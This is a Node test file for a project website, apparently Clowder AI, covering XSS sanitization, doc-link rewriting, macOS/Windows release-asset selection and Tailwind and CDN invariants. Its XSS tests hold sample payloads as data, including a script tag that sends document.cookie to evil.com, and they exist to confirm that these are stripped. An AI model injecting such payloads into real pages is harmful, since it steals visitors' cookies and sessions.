/**
 * Site integrity regression tests.
 *
 * Covers:
 *  - XSS hardening (behavioral: DOMPurify against real payloads)
 *  - Link rewriting (behavioral: resolveDocLink with real URLs)
 *  - Source invariants (structural: no CDN, no stale buttons, assets exist)
 *  - Tailwind CSS reproducibility
 *
 * Run: node --test site/site-integrity.test.mjs
 */
import assert from 'node:assert/strict';
import { existsSync, readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { dirname, resolve } from 'node:path';
import { describe, it } from 'node:test';
import vm from 'node:vm';
import { resolveDocLink, resolveImageSrc } from './lib/doc-links.mjs';
import { sanitizeMarkdown } from './lib/sanitize-md.mjs';

const require = createRequire(import.meta.url);
const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');
const { marked } = require('marked');

const SITE = resolve(dirname(new URL(import.meta.url).pathname));
const ROOT = resolve(SITE, '..');

function readSite(name) {
  return readFileSync(resolve(SITE, name), 'utf8');
}

// Execute the classic (non-module) lib/release-assets.js exactly as the browser
// does — in a fresh global — and read the ClowderReleaseAssets global it
// installs. The same file drives production and tests (production = test code path).
const { selectReleaseAssets } = (() => {
  const sandbox = {};
  sandbox.globalThis = sandbox;
  vm.createContext(sandbox);
  vm.runInContext(readSite('lib/release-assets.js'), sandbox);
  return sandbox.ClowderReleaseAssets;
})();

// ─── P1: XSS — behavioral sanitization tests ────────────────────────
describe('XSS sanitization (behavioral)', () => {
  // DOMPurify + marked versions pinned in root devDependencies to match CDN:
  //   dompurify@3.2.4, marked@15.0.7 (see package.json)
  const window = new JSDOM('').window;
  const DOMPurify = createDOMPurify(window);

  /**
   * Run the SAME sanitizeMarkdown function used by production pages.
   * Dependencies (DOMPurify, marked) are the CDN-pinned versions.
   */
  function renderIssueBody(body) {
    return sanitizeMarkdown(body, { DOMPurify, marked });
  }

  it('strips onerror XSS payload from issue body', () => {
    const malicious = '<img src=x onerror="alert(document.cookie)">';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /onerror/i, 'onerror handler must be stripped');
    assert.doesNotMatch(clean, /alert/i, 'alert call must be stripped');
  });

  it('strips javascript: protocol from issue body links', () => {
    const malicious = '[click me](javascript:alert(1))';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /javascript:/i, 'javascript: protocol must be stripped');
  });

  it('strips script tags from issue body', () => {
    const malicious = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /<script/i, 'script tags must be stripped');
  });

  it('strips event handlers embedded in markdown HTML', () => {
    const malicious = '<div onmouseover="alert(1)">hover me</div>';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /onmouseover/i, 'onmouseover must be stripped');
  });

  it('strips SVG-based XSS payloads', () => {
    const malicious = '<svg><animate onbegin="alert(1)"/></svg>';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /onbegin/i, 'SVG event handlers must be stripped');
  });

  it('strips data URI script injection', () => {
    const malicious = '<a href="data:text/html,<script>alert(1)</script>">click</a>';
    const clean = renderIssueBody(malicious);
    // DOMPurify strips data: URIs with text/html content type
    assert.doesNotMatch(clean, /data:text\/html/i, 'data: URI with HTML must be stripped');
  });

  it('preserves safe markdown content', () => {
    const safe = '## Hello\n\nThis is **bold** and [a link](https://example.com).';
    const clean = renderIssueBody(safe);
    assert.match(clean, /Hello/, 'headings must survive');
    assert.match(clean, /<strong>bold<\/strong>/, 'bold must survive');
    assert.match(clean, /href="https:\/\/example\.com"/, 'safe links must survive');
  });
});

// ─── P1: community.html structural invariants ────────────────────────
describe('community.html XSS invariants', () => {
  const html = readSite('community.html');

  it('does not use inline onclick for issue rows', () => {
    assert.doesNotMatch(html, /onclick\s*=\s*["']showIssueDetail\(/, 'inline onclick with issue data is an XSS vector');
  });

  it('uses issueMap lookup instead of inline attribute data', () => {
    assert.match(html, /issueMap\.get\(/, 'issue detail should retrieve data from Map');
  });

  it('imports lib/sanitize-md.mjs as a module', () => {
    assert.match(
      html,
      /import\s*\{[^}]*sanitizeMarkdown[^}]*\}\s*from\s*['"]\.\/lib\/sanitize-md\.mjs['"]/,
      'community.html must import sanitizeMarkdown from lib/sanitize-md.mjs',
    );
  });

  it('calls _sanitizeMarkdown (not inline DOMPurify.sanitize(marked.parse(...)))', () => {
    assert.match(html, /window\._sanitizeMarkdown\(/, 'sanitization must delegate to the shared module');
    // Inline script must NOT call DOMPurify.sanitize(marked.parse(...)) directly
    const scriptMatch = html.match(/<script>[\s\S]*?<\/script>/g) || [];
    const inlineScripts = scriptMatch.join('');
    assert.doesNotMatch(
      inlineScripts,
      /DOMPurify\.sanitize\(\s*marked\.parse\(/,
      'inline script must not bypass sanitize-md.mjs',
    );
  });
});

// ─── P1: docs.html uses doc-links.mjs (production = test code path) ─
describe('docs.html link rewriting implementation', () => {
  const html = readSite('docs.html');

  it('imports lib/doc-links.mjs as a module', () => {
    assert.match(
      html,
      /import\s*\{[^}]*resolveDocLink[^}]*\}\s*from\s*['"]\.\/lib\/doc-links\.mjs['"]/,
      'docs.html must import resolveDocLink from lib/doc-links.mjs',
    );
  });

  it('calls _resolveDocLink (not inline URL resolution)', () => {
    assert.match(html, /window\._resolveDocLink\(/, 'rewriteDocLinks must delegate to the shared module');
  });

  it('calls _resolveImageSrc (not inline URL resolution)', () => {
    assert.match(html, /window\._resolveImageSrc\(/, 'image rewriting must delegate to the shared module');
  });

  it('does not duplicate URL resolution logic inline', () => {
    // The inline script should NOT contain the resolution regex — that lives in doc-links.mjs
    const scriptMatch = html.match(/<script>[\s\S]*?<\/script>/g) || [];
    const inlineScripts = scriptMatch.join('');
    assert.doesNotMatch(
      inlineScripts,
      /new URL\(href,\s*['"]file:\/\/\/['"]/,
      'URL resolution math must not be duplicated inline',
    );
  });

  it('calls _sanitizeMarkdown (not inline DOMPurify.sanitize(marked.parse(...)))', () => {
    assert.match(html, /window\._sanitizeMarkdown\(/, 'doc rendering must delegate to shared sanitize-md.mjs');
    const scriptMatch = html.match(/<script>[\s\S]*?<\/script>/g) || [];
    const inlineScripts = scriptMatch.join('');
    assert.doesNotMatch(
      inlineScripts,
      /DOMPurify\.sanitize\(\s*marked\.parse\(/,
      'inline script must not bypass sanitize-md.mjs',
    );
  });
});

// ─── P1: Test dep versions match production CDN ─────────────────────
describe('test dependency version alignment', () => {
  it('marked version matches CDN pin in community.html', () => {
    const html = readSite('community.html');
    const cdnMatch = html.match(/marked@([\d.]+)/);
    assert.ok(cdnMatch, 'community.html must have version-pinned marked CDN');
    const testVersion = require('marked/package.json').version;
    assert.equal(testVersion, cdnMatch[1], `Test marked@${testVersion} must match CDN marked@${cdnMatch[1]}`);
  });

  it('DOMPurify version matches CDN pin in community.html', () => {
    const html = readSite('community.html');
    const cdnMatch = html.match(/dompurify@([\d.]+)/);
    assert.ok(cdnMatch, 'community.html must have version-pinned dompurify CDN');
    const pkgPath = resolve(ROOT, 'node_modules/dompurify/package.json');
    const testVersion = JSON.parse(readFileSync(pkgPath, 'utf8')).version;
    assert.equal(testVersion, cdnMatch[1], `Test dompurify@${testVersion} must match CDN dompurify@${cdnMatch[1]}`);
  });
});

// ─── P1: Link rewriting — behavioral tests ───────────────────────────
describe('resolveDocLink (behavioral)', () => {
  const loadable = new Set(['docs/faq.md', 'docs/configuration/environment.md', 'SETUP.md', 'README.md']);

  it('resolves root-relative .md link to viewer', () => {
    const result = resolveDocLink('SETUP.md', 'README.md', loadable);
    assert.equal(result.type, 'viewer');
    assert.equal(result.path, 'SETUP.md');
    assert.equal(result.hash, '');
  });

  it('resolves relative .md link from subdirectory to viewer', () => {
    const result = resolveDocLink('../faq.md', 'docs/configuration/environment.md', loadable);
    assert.equal(result.type, 'viewer');
    assert.equal(result.path, 'docs/faq.md');
  });

  it('preserves hash fragment for in-viewer navigation', () => {
    const result = resolveDocLink('../faq.md#where-do-i-add-api-keys', 'docs/configuration/environment.md', loadable);
    assert.equal(result.type, 'viewer');
    assert.equal(result.path, 'docs/faq.md');
    assert.equal(result.hash, '#where-do-i-add-api-keys');
  });

  it('resolves non-.md file to GitHub blob with hash', () => {
    const result = resolveDocLink('LICENSE', 'README.md', loadable);
    assert.equal(result.type, 'github');
    assert.match(result.url, /github\.com.*\/blob\/main\/LICENSE$/);
  });

  it('resolves .md not in loadable set to GitHub blob', () => {
    const result = resolveDocLink('docs/SOP.md', 'README.md', loadable);
    assert.equal(result.type, 'github');
    assert.match(result.url, /github\.com.*\/blob\/main\/docs\/SOP\.md$/);
  });

  it('preserves search + hash on GitHub blob links', () => {
    const result = resolveDocLink('CONTRIBUTING.md?tab=readme#dev-setup', 'README.md', loadable);
    assert.equal(result.type, 'github');
    assert.match(result.url, /CONTRIBUTING\.md\?tab=readme#dev-setup$/);
  });

  it('skips absolute URLs', () => {
    assert.deepEqual(resolveDocLink('https://example.com', 'README.md', loadable), { type: 'skip' });
  });

  it('skips pure anchors', () => {
    assert.deepEqual(resolveDocLink('#section', 'README.md', loadable), { type: 'skip' });
  });

  it('skips mailto links', () => {
    assert.deepEqual(resolveDocLink('mailto:a@b.com', 'README.md', loadable), { type: 'skip' });
  });

  it('skips javascript: URIs', () => {
    assert.deepEqual(resolveDocLink('javascript:alert(1)', 'README.md', loadable), { type: 'skip' });
  });

  it('skips null/empty href', () => {
    assert.deepEqual(resolveDocLink('', 'README.md', loadable), { type: 'skip' });
    assert.deepEqual(resolveDocLink(null, 'README.md', loadable), { type: 'skip' });
  });
});

describe('resolveImageSrc (behavioral)', () => {
  it('resolves relative image to GitHub raw URL', () => {
    const url = resolveImageSrc('images/arch.png', 'docs/architecture/overview.md');
    assert.match(url, /raw\.githubusercontent\.com.*\/docs\/architecture\/images\/arch\.png$/);
  });

  it('resolves root image from subdoc', () => {
    const url = resolveImageSrc('../../assets/logo.png', 'docs/architecture/overview.md');
    assert.match(url, /raw\.githubusercontent\.com.*\/assets\/logo\.png$/);
  });

  it('returns null for absolute URLs', () => {
    assert.equal(resolveImageSrc('https://cdn.example.com/img.png', 'README.md'), null);
  });

  it('returns null for data URIs', () => {
    assert.equal(resolveImageSrc('data:image/png;base64,abc', 'README.md'), null);
  });
});

// ─── P1: macOS architecture-specific downloads — behavioral ─────────
describe('selectReleaseAssets (behavioral)', () => {
  const dl = (name) => ({ name, browser_download_url: `https://example.com/${name}` });

  it('routes Apple Silicon and Intel Mac users to different, arch-correct DMGs', () => {
    // Real v0.12.0 release shape: parallel arm64 + x64 DMGs, arm64 first in the array.
    const assets = [
      dl('ClowderAI-0.12.0-arm64.dmg'),
      dl('ClowderAI-0.12.0-x64.dmg'),
      dl('ClowderAI-0.12.0.zip'),
      dl('ClowderAI-Setup-0.12.0.exe'),
    ];
    const { macArm, macIntel, windows } = selectReleaseAssets(assets);
    assert.match(macArm.name, /arm64/, 'Apple Silicon button must resolve to the arm64 DMG');
    assert.match(macIntel.name, /x64/, 'Intel button must resolve to the x64 DMG');
    assert.notEqual(macArm.name, macIntel.name, 'the two arch buttons must not point at the same DMG');
    assert.match(windows.name, /\.exe$/, 'Windows button must resolve to the .exe');
  });

  it('falls back to the releases page (undefined) when an arch build is missing', () => {
    const { macArm, macIntel } = selectReleaseAssets([dl('ClowderAI-0.12.0-arm64.dmg')]);
    assert.match(macArm.name, /arm64/);
    assert.equal(macIntel, undefined, 'no Intel DMG → Intel button keeps its static /releases fallback');
  });

  it('serves a universal DMG to both architectures', () => {
    const { macArm, macIntel } = selectReleaseAssets([dl('ClowderAI-0.12.0-universal.dmg')]);
    assert.ok(macArm && macIntel);
    assert.equal(macArm.name, macIntel.name);
    assert.match(macArm.name, /universal/);
  });

  it('serves a lone untagged DMG to everyone', () => {
    const { macArm, macIntel } = selectReleaseAssets([dl('ClowderAI-0.12.0.dmg')]);
    assert.equal(macArm?.name, 'ClowderAI-0.12.0.dmg');
    assert.equal(macIntel?.name, 'ClowderAI-0.12.0.dmg');
  });

  it('tolerates empty or malformed releases without throwing', () => {
    // vm-loaded objects live in another realm, so compare fields, not deepEqual.
    const empty = selectReleaseAssets([]);
    assert.equal(empty.windows, undefined);
    assert.equal(empty.macArm, undefined);
    assert.equal(empty.macIntel, undefined);
    assert.equal(empty.macUniversal, undefined);
    assert.doesNotThrow(() => selectReleaseAssets(undefined));
    assert.doesNotThrow(() => selectReleaseAssets([null, { name: 42 }]));
  });
});

// ─── P1: download UI exposes both Mac architectures — structural ────
describe('download buttons (structural)', () => {
  it('index.html exposes both Apple Silicon and Intel Mac buttons', () => {
    const html = readSite('index.html');
    assert.match(html, /id="dl-mac-arm"/, 'must have an Apple Silicon (arm64) download button');
    assert.match(html, /id="dl-mac-intel"/, 'must have an Intel (x64) download button');
  });

  it('index.html has no ambiguous single-DMG macOS button', () => {
    const html = readSite('index.html');
    assert.doesNotMatch(html, /id="dl-mac"/, 'the ambiguous single #dl-mac button must be gone');
  });

  it('main.js resolves downloads via the shared ClowderReleaseAssets global', () => {
    const js = readSite('main.js');
    assert.match(js, /ClowderReleaseAssets/, 'main.js must use the shared ClowderReleaseAssets global');
    assert.match(js, /dl-mac-arm/, 'main.js must wire the Apple Silicon button');
    assert.match(js, /dl-mac-intel/, 'main.js must wire the Intel button');
    assert.doesNotMatch(js, /^\s*import\s/m, 'main.js must stay a classic script (static import would break file://)');
  });

  it('index.html loads classic release-assets.js before main.js (file:// safe)', () => {
    const html = readSite('index.html');
    const relIdx = html.indexOf('lib/release-assets.js');
    const mainIdx = html.indexOf('src="main.js"');
    assert.ok(relIdx > -1, 'index.html must load lib/release-assets.js');
    assert.ok(mainIdx > -1 && relIdx < mainIdx, 'release-assets.js must load before main.js');
    assert.doesNotMatch(
      html,
      /<script[^>]*type="module"[^>]*main\.js/,
      'main.js must NOT be an ES module (file:// direct-open contract)',
    );
  });
});

// ─── P2: No runtime Tailwind CDN ─────────────────────────────────────
describe('no runtime Tailwind CDN', () => {
  for (const page of ['index.html', 'docs.html', 'community.html']) {
    it(`${page} does not load cdn.tailwindcss.com`, () => {
      const html = readSite(page);
      assert.doesNotMatch(html, /cdn\.tailwindcss\.com/, `${page} should use pre-built tailwind.css, not CDN`);
    });
  }

  it('pre-built tailwind.css exists', () => {
    assert.ok(existsSync(resolve(SITE, 'tailwind.css')));
  });

  it('tailwind config exists for reproducible rebuilds', () => {
    assert.ok(existsSync(resolve(ROOT, 'tailwind.site.config.js')));
  });

  it('tailwind input CSS exists for reproducible rebuilds', () => {
    assert.ok(existsSync(resolve(SITE, 'input.css')));
  });

  it('tailwind build script exists', () => {
    assert.ok(existsSync(resolve(ROOT, 'scripts/build-site-css.mjs')));
  });

  it('generated Tailwind CSS is excluded from Biome formatting', () => {
    const biome = JSON.parse(readFileSync(resolve(ROOT, 'biome.json'), 'utf8'));
    assert.ok(
      biome.files.includes.includes('!site/tailwind.css'),
      'site/tailwind.css is generated and must be validated by check:site-css, not reformatted by Biome',
    );
  });
});

// ─── P2: lang toggle scoping ─────────────────────────────────────────
describe('lang toggle only on translated pages', () => {
  it('main.js skips initLang when lang-toggle button is absent', () => {
    const js = readSite('main.js');
    assert.match(js, /if\s*\(\s*!btn\s*\)\s*return/, 'initLang should bail without lang-toggle');
  });

  for (const page of ['docs.html', 'community.html']) {
    it(`${page} does not have a lang-toggle button`, () => {
      const html = readSite(page);
      assert.doesNotMatch(html, /id\s*=\s*["']lang-toggle["']/);
    });
  }
});

// ─── Local asset existence ───────────────────────────────────────────
describe('HTML-referenced local assets exist', () => {
  const assetRe = /(?:src|href)\s*=\s*["']((?:assets|styles|main|tailwind|input)[^"']*?)["']/g;

  for (const page of ['index.html', 'docs.html', 'community.html']) {
    it(`${page} — all local asset paths resolve`, () => {
      const html = readSite(page);
      const missing = [];
      for (const m of html.matchAll(assetRe)) {
        const ref = m[1];
        if (/^(https?:|data:)/i.test(ref)) continue;
        if (!existsSync(resolve(SITE, ref))) missing.push(ref);
      }
      assert.deepStrictEqual(missing, [], `Missing: ${missing.join(', ')}`);
    });
  }
});

// ─── Transparent Clowder AI brand mark ──────────────────────────────
describe('transparent Clowder AI logo contract', () => {
  const transparentLogo = 'assets/logo-transparent.png';

  for (const page of ['index.html', 'docs.html', 'community.html']) {
    it(`${page} uses the transparent logo as its favicon`, () => {
      const document = new JSDOM(readSite(page)).window.document;
      const icon = document.querySelector('link[rel="icon"]');
      assert.equal(icon?.getAttribute('href'), transparentLogo);
      const brandMark = document.querySelector(`img[src="${transparentLogo}"]`);
      assert.ok(brandMark, `${page} should render the transparent logo in its navigation`);
    });
  }
});

// ─── Homepage Quick Start visual contract ───────────────────────────
describe('homepage Quick Start visual contract', () => {
  const html = readSite('index.html');
  const document = new JSDOM(html).window.document;

  for (const platform of ['windows', 'mac']) {
    it(`${platform} download panel is a light card, not a terminal`, () => {
      const card = document.querySelector(`#install-${platform} > div`);
      assert.ok(card, `missing #install-${platform} card`);
      assert.ok(card.classList.contains('bg-white'), `${platform} card should be light in the default theme`);
      assert.ok(card.classList.contains('border'), `${platform} card should retain a visible card boundary`);
      assert.ok(!card.classList.contains('bg-stone-900'), `${platform} card must not reuse the terminal background`);
      assert.ok(!card.classList.contains('code-container'), `${platform} card must not use terminal semantics`);
    });
  }

  it('renders the three local First Steps walkthrough videos', () => {
    const expected = [
      'assets/guides/step1-add-account.mp4',
      'assets/guides/step2-add-member.mp4',
      'assets/guides/step3-say-hi.mp4',
    ];
    const section = document.getElementById('first-steps');
    assert.ok(section, 'homepage must include the First Steps walkthrough section');
    const sequence = section.querySelector('.space-y-16');
    assert.ok(sequence, 'First Steps should stack the three walkthrough rows vertically');
    const steps = [...sequence.querySelectorAll(':scope > article')];
    assert.strictEqual(steps.length, 3, 'First Steps should contain three stacked walkthrough rows');
    assert.ok(steps[0].classList.contains('md:flex-row'), 'step 1 should use the original text/video row');
    assert.ok(steps[1].classList.contains('md:flex-row-reverse'), 'step 2 should alternate video and text');
    assert.ok(steps[2].classList.contains('md:flex-row'), 'step 3 should return to the text/video row');
    const videos = [...section.querySelectorAll('video')];
    assert.deepStrictEqual(
      videos.map((video) => video.getAttribute('src')),
      expected,
    );
    for (const video of videos) {
      assert.ok(video.autoplay, `${video.getAttribute('src')} should autoplay`);
      assert.ok(video.hasAttribute('muted'), `${video.getAttribute('src')} should be muted`);
      assert.ok(video.loop, `${video.getAttribute('src')} should loop`);
      assert.ok(video.playsInline, `${video.getAttribute('src')} should play inline`);
      assert.ok(existsSync(resolve(SITE, video.getAttribute('src'))), `${video.getAttribute('src')} must exist`);
    }
  });
});

// ─── SETUP.md compatibility ──────────────────────────────────────────
describe('SETUP.md compatibility', () => {
  const sourceRepo = existsSync(resolve(ROOT, 'sync-manifest.yaml'));
  const expectedSetupFiles = sourceRepo
    ? ['SETUP.opensource.md', 'SETUP.opensource.zh-CN.md']
    : ['SETUP.md', 'SETUP.zh-CN.md'];

  for (const setupFile of expectedSetupFiles) {
    it(`${setupFile} exists in the ${sourceRepo ? 'source' : 'public'} repository`, () => {
      assert.ok(existsSync(resolve(ROOT, setupFile)));
    });
  }
});

// ─── CDN version pinning ─────────────────────────────────────────────
describe('CDN scripts are version-pinned', () => {
  for (const page of ['docs.html', 'community.html']) {
    it(`${page} — marked is version-pinned`, () => {
      const html = readSite(page);
      if (html.includes('marked')) {
        assert.match(html, /marked@[\d.]+/);
      }
    });

    it(`${page} — DOMPurify is version-pinned`, () => {
      const html = readSite(page);
      if (html.includes('dompurify')) {
        assert.match(html, /dompurify@[\d.]+/);
      }
    });
  }
});
